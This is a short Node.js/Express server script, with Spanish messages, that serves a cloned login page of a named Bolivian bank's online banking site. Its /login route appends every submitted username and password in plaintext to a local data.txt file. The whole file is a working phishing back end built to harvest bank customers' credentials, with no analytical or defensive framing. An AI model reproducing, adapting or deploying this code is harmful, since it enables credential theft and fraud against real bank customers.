const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 8000;

app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const usuario = req.body.usuario;
    const password = req.body.password;

    const dataToWrite = `Usuario: ${usuario} Password: ${password}\n`;
    const filePath = path.join(__dirname, 'data.txt');

    fs.appendFile(filePath, dataToWrite, (err) => {
        if (err) {
            console.error("Error al escribir en el archivo:", err);
            res.status(500).send("Error al escribir en el archivo");
        } else {
            console.log("Datos guardados correctamente");
            res.send("Se guardaron tus datos");
        }
    });
});


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'ecofuturo', 'econet.bancoecofuturo.com.bo_447', 'EconetWeb', 'Login.html'));
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}/ecofuturo/econet.bancoecofuturo.com.bo_447/EconetWeb/Login.html`); //public\ecofuturo\econet.bancoecofuturo.com.bo_447\EconetWeb\Login.html
});
